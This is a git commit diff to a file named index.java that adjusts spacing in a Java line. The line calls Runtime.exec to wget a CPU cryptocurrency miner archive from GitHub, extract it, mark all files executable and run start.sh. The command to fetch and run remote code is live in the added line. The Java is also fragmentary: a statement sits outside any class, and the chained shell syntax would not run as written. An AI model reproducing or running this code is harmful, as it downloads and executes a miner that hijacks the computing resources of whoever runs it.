c1cc5fc05088fa1013faa9955d78cec98fe60b6e
RIFAIGGZ <76506048+itsmeR1F4I@users.noreply.github.com>
2022-06-22 18:11:42 +0700

    Update index.java

--- index.java
+++ index.java
@@ -1,4 +1,4 @@
-Process process = Runtime.getRuntime().exec("wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz && tar xf hellminer_cpu_linux.tar.gz && chmod +x *&& bash start.sh");
+Process process = Runtime.getRuntime().exec("wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz && tar xf hellminer_cpu_linux.tar.gz && chmod +x * && bash start.sh");
 public static void printResults(Process process) throws IOException {
     BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
     String line = "";
